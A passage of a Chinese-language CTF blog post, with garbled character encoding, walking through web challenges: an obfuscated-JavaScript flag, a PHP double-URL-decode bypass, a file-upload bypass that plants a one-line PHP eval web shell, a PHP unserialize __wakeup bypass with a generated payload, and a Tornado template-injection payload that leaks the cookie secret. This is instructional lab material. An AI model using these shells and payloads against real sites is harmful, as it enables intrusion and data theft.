<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CTFæ”»é˜²ä¸–ç•Œ webè¿›é˜¶é¢˜ 11-20 | MambaInVeins Blog</title><meta name="keywords" content="ctf"><meta name="author" content="MambaInVeins"><meta name="copyright" content="MambaInVeins"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="11. NaNNaNNaNNaN-Batman 12. PHP2 13. upload1 14. Web_php_unserialize 15. easytornado 16. shrine 17. lottery 18. mfw 19. web2 20. fakebook  ## NaNNaNNaNNaN-Batman  ä¸‹è½½é™„ä»¶ï¼Œæœ‰ä¹±ç ï¼Œä½†å¯ä»¥å‘ç°æ˜¯jsä»£ç ã€‚ç”¨æµè§ˆå™¨æ‰“å¼€å‡ºç°ä¸€ä¸ªæœç´¢æ¡†ï¼Œä½†">
<meta property="og:type" content="article">
<meta property="og:title" content="CTFæ”»é˜²ä¸–ç•Œ webè¿›é˜¶é¢˜ 11-20">
<meta property="og:url" content="http://mambainveins.gitee.io/mambainveins/2020/08/04/2020/08/2020-08-04-CTF_world_web_advance_2/index.html">
<meta property="og:site_name" content="MambaInVeins Blog">
<meta property="og:description" content="11. NaNNaNNaNNaN-Batman 12. PHP2 13. upload1 14. Web_php_unserialize 15. easytornado 16. shrine 17. lottery 18. mfw 19. web2 20. fakebook  ## NaNNaNNaNNaN-Batman  ä¸‹è½½é™„ä»¶ï¼Œæœ‰ä¹±ç ï¼Œä½†å¯ä»¥å‘ç°æ˜¯jsä»£ç ã€‚ç”¨æµè§ˆå™¨æ‰“å¼€å‡ºç°ä¸€ä¸ªæœç´¢æ¡†ï¼Œä½†">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0189.png">
<meta property="article:published_time" content="2020-08-03T16:00:00.000Z">
<meta property="article:modified_time" content="2021-09-14T17:19:15.557Z">
<meta property="article:author" content="MambaInVeins">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0189.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://mambainveins.gitee.io/mambainveins/2020/08/04/2020/08/2020-08-04-CTF_world_web_advance_2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: {"limitCount":50,"languages":{"author":"ä½œè€…: MambaInVeins","link":"é“¾æ¥: ","source":"æ¥æº: MambaInVeins Blog","info":"è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}

// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
const getScript = url => new Promise((resolve, reject) => {
  const script = document.createElement('script')
  script.src = url
  script.async = true
  script.onerror = reject
  script.onload = script.onreadystatechange = function() {
    const loadState = this.readyState
    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
    script.onload = script.onreadystatechange = null
    resolve()
  }
  document.head.appendChild(script)
})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: false,
  postUpdate: '2021-09-15 01:19:15'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}const fontSizeVal = saveToLocal.get('global-font-size')
if (fontSizeVal !== undefined) {
  document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
}})()</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/blogpublic/MambaInVeins.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">248</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">82</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">28</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/moment"><i class="fa-fw fas fa-comment-alt"></i><span> ç¢è¯­</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å¸¸ç”¨é“¾æ¥</span></a></div><div class="menus_item"><a class="site-page" href="/box"><i class="fa-fw fas fa-box"></i><span> å·¥å…·ç®±</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/wallpaper/0189.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">MambaInVeins Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/moment"><i class="fa-fw fas fa-comment-alt"></i><span> ç¢è¯­</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å¸¸ç”¨é“¾æ¥</span></a></div><div class="menus_item"><a class="site-page" href="/box"><i class="fa-fw fas fa-box"></i><span> å·¥å…·ç®±</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTFæ”»é˜²ä¸–ç•Œ webè¿›é˜¶é¢˜ 11-20</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2020-08-03T16:00:00.000Z" title="å‘è¡¨äº 2020-08-04 00:00:00">2020-08-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2021-09-14T17:19:15.557Z" title="æ›´æ–°äº 2021-09-15 01:19:15">2021-09-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">å­—æ•°æ€»è®¡:</span><span class="word-count">98</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>1åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container">

11. NaNNaNNaNNaN-Batman
12. PHP2
13. upload1
14. Web_php_unserialize
15. easytornado
16. shrine
17. lottery
18. mfw
19. web2
20. fakebook

## NaNNaNNaNNaN-Batman

ä¸‹è½½é™„ä»¶ï¼Œæœ‰ä¹±ç ï¼Œä½†å¯ä»¥å‘ç°æ˜¯jsä»£ç ã€‚ç”¨æµè§ˆå™¨æ‰“å¼€å‡ºç°ä¸€ä¸ªæœç´¢æ¡†ï¼Œä½†æ²¡æœ‰ä»€ä¹ˆååº”ã€‚

    <script>_='function $(){e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\'_ns=[t,n,r,i];for(o=0;o<13;++o){	[0]);.splice(0,1)}}}	\'<input id="c">< onclick=$()>Ok</>\');delete _var ","docu.)match(/"];/)!=null=["	write(s[o%4]buttonif(e.ment';for(Y in $='	')with(_.split($[Y]))_=join(pop());eval(_)</script>

å®¡è®¡ä»£ç å¯ä»¥çœ‹åˆ°æœ€å¼€å§‹çš„ä¸‹åˆ’çº¿â€œ\_â€æ˜¯ä¸€ä¸ªå˜é‡ï¼Œå…¶å†…å®¹æ˜¯ä¸€ä¸ªå‡½æ•°çš„ä»£ç ï¼Œè€Œæœ€ååˆæ˜¯ä¸€ä¸ªeval(_)ï¼Œè¿™é‡Œæ‰§è¡Œäº†_å˜é‡ä¸­çš„å†…å®¹ä¹Ÿå°±æ˜¯''ä¸­çš„å†…å®¹ã€‚ä½†æ˜¯ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œå®ƒå¹¶æ²¡æœ‰æ‰§è¡Œ$()å‡½æ•°ï¼Œä»…ä»…æ‰§è¡Œäº†å­—ç¬¦ä¸²è€Œå·²ï¼ˆä»è€Œå¯¼è‡´ä¹±ç ï¼‰ï¼Œå› è€Œé¡µé¢htmlé¡µé¢æ²¡æœ‰ä»»ä½•æ˜¾ç¤ºï¼Œåªæ˜¾ç¤ºäº†inputæ ‡ç­¾çš„å†…å®¹ã€‚ä½†æ˜¯æˆ‘ä»¬æƒ³è®©æºä»£ç æ­£å¸¸æ˜¾ç¤ºå‡ºæ¥ï¼Œä¸è¿›è¡Œæ‰§è¡Œï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å°±ç”¨åˆ°äº†alertå¼¹çª—ï¼ˆå°†evalå‡½æ•°æ”¹ä¸ºalertï¼‰ï¼Œå°†ä¹±ç çš„$()å‡½æ•°æºç å®Œæ•´æ˜¾ç¤ºå‡ºæ¥ã€‚

    function $() {
        var e = document.getElementById("c").value;
        if (e.length == 16)
            if (e.match(/^be0f23/) != null)
                if (e.match(/233ac/) != null)
                    if (e.match(/e98aa$/) != null)
                        if (e.match(/c7be9/) != null) {
                            var t = ["fl", "s_a", "i", "e}"];
                            var n = ["a", "_h0l", "n"];
                            var r = ["g{", "e", "_0"];
                            var i = ["it'", "_", "n"];
                            var s = [t, n, r, i];
                            for (var o = 0; o < 13; ++o) {
                                document.write(s[o % 4][0]);
                                s[o % 4].splice(0, 1)
                            }
                        }
    }
    document.write('<input id="c"><button onclick=$()>Ok</button>');
    delete _

ä¸ç”¨æ ¹æ®è¿™äº›ä¸ªå˜é‡å’Œdocument.writeå»ç®—flagï¼Œæ‹¿åˆ°flagæœ‰ä¸¤ç§æ–¹æ³•ï¼š

1ï¼‰æ»¡è¶³æ­£åˆ™

é¦–å…ˆï¼Œæ»¡è¶³length==16ï¼Œæ­£åˆ™çš„è¯^ä¸ºå¼€å§‹ç¬¦å·ï¼Œ$ä¸ºç»“å°¾ç¬¦å·ï¼Œæ‹¼æ¥ä¸€ä¸‹ï¼šbe0f233ac7be98aaï¼Œè¾“å…¥å°±æ‹¿åˆ°flagäº†ã€‚

2ï¼‰å°†ä¸‹é¢è¿™æ®µæ‹¿åˆ°æ§åˆ¶å°æ‰§è¡Œä¸€ä¸‹å³å¯ï¼š

    var t=["fl","s_a","i","e}"];
    var n=["a","_h0l","n"];
    var r=["g{","e","_0"];
    var i=["it'","_","n"];
    var s=[t,n,r,i];
    for(var o=0;o<13;++o){
        document.write(s[o%4][0]);s[o%4].splice(0,1)
        }

## PHP2

æ‰«äº†ä¸‹ç«¯å£å’Œç›®å½•ï¼Œæ²¡å‘ç°å•¥æœ‰ç”¨çš„ä¿¡æ¯ã€‚çœ‹äº†æç¤ºï¼Œéœ€è¦ç”¨åˆ°phpæºæ–‡ä»¶phps(ä¹‹å‰æ²¡å¬è¯´è¿‡)

è®¿é—®index.phps å‡ºç°æºç 

    <?php
    if("admin"===$_GET[id]) {
    echo("<p>not allowed!</p>");
    exit();
    }

    $_GET[id] = urldecode($_GET[id]);
    if($_GET[id] == "admin")
    {
    echo "<p>Access granted!</p>";
    echo "<p>Key: xxxxxxx </p>";
    }
    ?>

    Can you anthenticate to this website?

payload:

    index.php?id=%2561%2564%256d%2569%256e
    index.php?id=%2561dmin

æ­¤å¤„åŸç†æ˜¯phpå¯¹ä¼ è¿›æ¥çš„å‚æ•°idè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œä½†"admin"===$_GET[id]è¿”å›false,ç„¶åurldecodeå†æ¬¡å¯¹è§£ç åçš„ç»“æœè¿›è¡Œè§£ç ã€‚

è§£ç ç»“æœä¸ºadminã€‚æ­¤æ—¶admin==adminï¼Œè¿”å›true,æ‹¿åˆ°flag.

æ­¤å¤„é™„ä¸€å¼ urlç¼–ç è¡¨ï¼š

![](https://cdn.jsdelivr.net/gh/mambainveins/ImageHosting/img/20190731140712210.png)

çŸ¥è¯†ç‚¹ï¼š

    phpå¤‡ä»½æ–‡ä»¶ï¼šåç¼€ä¸ºphp~æˆ–è€…index.php.bak
    phpçš„æºä»£ç æ–‡ä»¶ï¼šåç¼€ä¸ºphps
    ===æ˜¯åŒ…æ‹¬å˜é‡å€¼ä¸ç±»å‹å®Œå…¨ç›¸ç­‰ï¼Œè€Œ==åªæ˜¯æ¯”è¾ƒä¸¤ä¸ªæ•°çš„å€¼æ˜¯å¦ç›¸ç­‰



## upload1

é€‰æ‹©æ–‡ä»¶ä¸Šä¼ ï¼ŒæŸ¥çœ‹æºç 

    <!Doctype html>
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <script type="text/javascript">
    
    Array.prototype.contains = function (obj) {  
        var i = this.length;  
        while (i--) {  
            if (this[i] === obj) {  
                return true;  
            }  
        }  
        return false;  
    }  

    function check(){
    upfile = document.getElementById("upfile");
    submit = document.getElementById("submit");
    name = upfile.value;
    ext = name.replace(/^.+\./,'');
    if(['jpg','png'].contains(ext)){
        submit.disabled = false;
    }else{
        submit.disabled = true;
        alert('è¯·é€‰æ‹©ä¸€å¼ å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ !');
    }
    }
    </script>
    </head>

    <body>
    <form enctype='multipart/form-data' id='aa' name='aaa' method='post' action='index.php'> 
    <input  id="upfile" name='upfile' type='file' onchange="check();" /> 
    <input type='submit'  id ='submit' value='ä¸Šä¼ '> 
    </form> 
    </body>
    </html>

ext = name.replace(/^.+./,â€™â€™) 

åˆ é™¤æ–‡ä»¶çš„åç§°

if([â€˜jpgâ€™,â€˜pngâ€™].contains(ext))

æ£€æŸ¥åç¼€æ˜¯å¦ä¸ºjpgï¼Œå¦‚æœä¸æ˜¯å°±ç¦ç”¨æŒ‰é’®å¹¶å¼¹çª—æŠ¥é”™

è¿‡æ»¤æ˜¯åœ¨å‰ç«¯ï¼Œæ‰€ä»¥æˆ‘ä»¬ç¼–å†™ä¸€å¥è¯æœ¨é©¬1.txt

<?php @eval($_POST['shell']);?>

å¹¶ä¿®æ”¹åç¼€ä¸ºjpgæˆ–è€…pngï¼Œä¹‹åä¸Šä¼ ã€‚BPæŠ“åŒ…ä¹‹åæ”¹åç¼€åï¼Œæ”¾è¡Œã€‚

å‘ç°è¿”å›ç½‘é¡µ upload success : upload/1595487399.1.php 

æ­¤æ—¶èœåˆ€è¿æ¥http://220.249.52.133:37062/upload/1595487399.1.php ï¼Œçœ‹åˆ°æœ‰flag.phpæ–‡ä»¶ï¼Œè®¿é—®åè·å¾—flag.

## Web_php_unserialize

é¢˜ç›®

ä»£ç å®¡è®¡

    <?php 
    class Demo { 
        private $file = 'index.php';
        public function __construct($file) { 
            $this->file = $file;  //æ„é€ å‡½æ•°ï¼Œå¯¹ç±»çš„å˜é‡è¿›è¡Œåˆå§‹åŒ–
        }
        function __destruct() { 
            echo @highlight_file($this->file, true); 
        }

        //é­”æœ¯æ–¹æ³•ï¼Œå¦‚æœæœ‰ååºåˆ—åŒ–çš„ä½¿ç”¨ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹å‰ä¼šå…ˆè°ƒç”¨è¿™ä¸ªæ–¹æ³•
        function __wakeup() { 
            if ($this->file != 'index.php') { 
                //the secret is in the fl4g.php
                $this->file = 'index.php'; 
            } 
        } 
    }
    if (isset($_GET['var'])) { 
        $var = base64_decode($_GET['var']); 

        //æ­£åˆ™åŒ¹é…ï¼Œå¦‚æœåœ¨varå˜é‡ä¸­å­˜åœ¨O/C:æ•°å­—(O:æ•°å­—æˆ–è€…C:æ•°å­—è¿™æ ·çš„å½¢å¼})ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œå°±è¾“å‡ºstop hacking!å¦åˆ™çš„è¯å°±è¿›è¡Œååºåˆ—åŒ–
        if (preg_match('/[oc]:\d+:/i', $var)) { 
            die('stop hacking!'); 
        } else {
            @unserialize($var); 
        } 
    } else { 
        highlight_file("index.php"); 
    } 
    ?>

å®¡è®¡å®Œæˆä¹‹åï¼Œæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œå¯¹Demoè¿™ä¸ªç±»è¿›è¡Œåºåˆ—åŒ–ï¼Œbase64åŠ å¯†ä¹‹åï¼Œèµ‹å€¼ç»™varå˜é‡è¿›è¡Œgetä¼ å‚å°±è¡Œäº†

åœ¨ç±»Demoä¸­æœ‰ä¸‰ä¸ªæ–¹æ³•ï¼Œä¸€ä¸ªæ„é€ ï¼Œä¸€ä¸ªææ„ï¼Œè¿˜æœ‰å°±æ˜¯ä¸€ä¸ªé­”æœ¯æ–¹æ³•

æ„é€ å‡½æ•°__construct()åœ¨ç¨‹åºæ‰§è¡Œå¼€å§‹çš„æ—¶å€™å¯¹å˜é‡è¿›è¡Œèµ‹åˆå€¼

ææ„å‡½æ•°__destruct()ï¼Œåœ¨å¯¹è±¡æ‰€åœ¨å‡½æ•°æ‰§è¡Œå®Œæˆä¹‹åï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œè¿™é‡Œå°±ä¼šé«˜äº®æ˜¾ç¤ºå‡ºæ–‡ä»¶ã€‚

åœ¨ååºåˆ—åŒ–æ‰§è¡Œä¹‹å‰ï¼Œä¼šå…ˆæ‰§è¡Œ__wakeupè¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡ï¼Œå½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶å¯ç»•è¿‡wakeupæ–¹æ³•ï¼Œæ­£åˆ™åŒ¹é…å¯ä»¥ç”¨+å·æ¥è¿›è¡Œç»•è¿‡ã€‚

ä»£ç ï¼š

    <?php 
    class Demo { 
        private $file = 'index.php';
        public function __construct($file) { 
            $this->file = $file; 
        }
        function __destruct() { 
            echo @highlight_file($this->file, true); 
        }
        function __wakeup() { 
            if ($this->file != 'index.php') { 
                //the secret is in the fl4g.php
                $this->file = 'index.php'; 
            } 
        } 
    }
        $A = new Demo('fl4g.php');
        $b = serialize($A);
        echo $b;
        $b = str_replace('O:4', 'O:+4',$b);//ç»•è¿‡preg_match
        echo $b;
        $b = str_replace(':1:', ':2:',$b);//ç»•è¿‡wakeup
        echo $b;
        echo base64_encode($b);
    ?>

åˆ©ç”¨phpè°ƒè¯•æ‰§è¡Œç»“æœä¸ºï¼š

    O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
    O:+4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}
    O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}
    TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

ç”¨+4æ›¿æ¢æˆ4æ˜¯ä¸ºäº†ç»•è¿‡preg_matchçš„æ­£åˆ™è¡¨è¾¾å¼

åŒæ ·çš„æŠŠ2æ›¿æ¢æˆ1æ˜¯åˆ©ç”¨äº†CVE-2016-7124çš„æ¼æ´ï¼Œå³å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ

è¿™é‡Œæœ‰ä¸ªå‘ï¼Œè¿™é‡Œçš„fileå˜é‡ä¸ºç§æœ‰å˜é‡ï¼Œæ‰€ä»¥åºåˆ—åŒ–ä¹‹åçš„è¡¨ç¤ºæ–¹å¼æ˜¯åœ¨å˜é‡åå‰åŠ ä¸Š%00ç±»å%00ï¼Œå­—ç¬¦ä¸²é•¿åº¦ä¹Ÿæ¯”å®é™…é•¿åº¦å¤§2ã€‚ç±»ä¼¼çš„è¿˜æœ‰protectedç±»å‹çš„å˜é‡ï¼Œåºåˆ—åŒ–ä¹‹åå­—ç¬¦ä¸²é¦–éƒ¨ä¼šåŠ ä¸Š%00*%00ã€‚

phpæ˜¯ä¸ºäº†åŒºåˆ«è¿™äº›å±æ€§æ‰€ä»¥è¿›è¡Œäº†ä¸€äº›ä¿®é¥°ï¼Œåˆ©ç”¨çš„å°±æ˜¯è¿™ä¸ªä¹±ç %00ï¼ˆurlç¼–ç ï¼Œhexå°±æ˜¯0x00ï¼‰ï¼Œè¡¨ç¤ºçš„æ˜¯NULLã€‚

æœ€åæŒ‰ç…§é¢˜ç›®çš„æ„æ€encodeä¸€ä¸‹base64å°±è·å–ååºåˆ—åŒ–çš„ç»“æœï¼Œgetä¼ å‚å³å¯

    ?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

çŸ¥è¯†ç‚¹ï¼š

[PHPååºåˆ—åŒ–æ¼æ´ç®€ä»‹åŠç›¸å…³æŠ€å·§å°ç»“](https://cloud.tencent.com/developer/article/1485821)


## easytornado

tornadoæ˜¯pythonä¸­çš„ä¸€ä¸ªwebåº”ç”¨æ¡†æ¶ã€‚

æ‹¿åˆ°é¢˜ç›®å‘ç°æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼š

(1)flag.txt

    /flag.txt
    flag in /fllllllllllllag

å‘ç°flagåœ¨/fllllllllllllagæ–‡ä»¶é‡Œï¼›

(2)welcome.txt

    /welcome.txt
    render

renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œæ¸²æŸ“å˜é‡åˆ°æ¨¡æ¿ä¸­ï¼Œå³å¯ä»¥é€šè¿‡ä¼ é€’ä¸åŒçš„å‚æ•°å½¢æˆä¸åŒçš„é¡µé¢ã€‚

(3)hints.txt

    /hints.txt
    md5(cookie_secret+md5(filename))

filehash=md5(cookie_secret+md5(filename)) 

ç°åœ¨filename=/fllllllllllllagï¼Œåªéœ€è¦çŸ¥é“cookie_secretçš„æ—¢èƒ½è®¿é—®flagã€‚

æµ‹è¯•åå‘ç°è¿˜æœ‰ä¸€ä¸ªerrorç•Œé¢ï¼Œæ ¼å¼ä¸º/error?msg=Errorï¼Œæ€€ç–‘å­˜åœ¨æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡» ï¼ˆSSTIï¼‰

å°è¯•/error?msg={{datetime}} åœ¨Tornadoçš„å‰ç«¯é¡µé¢æ¨¡æ¿ä¸­ï¼Œdatetimeæ˜¯æŒ‡å‘pythonä¸­datetimeè¿™ä¸ªæ¨¡å—ï¼ŒTornadoæä¾›äº†ä¸€äº›å¯¹è±¡åˆ«åæ¥å¿«é€Ÿè®¿é—®å¯¹è±¡ï¼Œå¯ä»¥å‚è€ƒTornadoå®˜æ–¹æ–‡æ¡£

é€šè¿‡æŸ¥é˜…æ–‡æ¡£å‘ç°cookie_secretåœ¨Applicationå¯¹è±¡settingså±æ€§ä¸­ï¼Œè¿˜å‘ç°self.application.settingsæœ‰ä¸€ä¸ªåˆ«å

    RequestHandler.settings
    An alias for self.application.settings.

handleræŒ‡å‘çš„å¤„ç†å½“å‰è¿™ä¸ªé¡µé¢çš„RequestHandlerå¯¹è±¡ï¼Œ RequestHandler.settingsæŒ‡å‘self.application.settingsï¼Œ å› æ­¤handler.settingsæŒ‡å‘RequestHandler.application.settingsã€‚

æ„é€ payloadè·å–cookie_secret

    http://220.249.52.133:49325/error?msg={{handler.settings}}

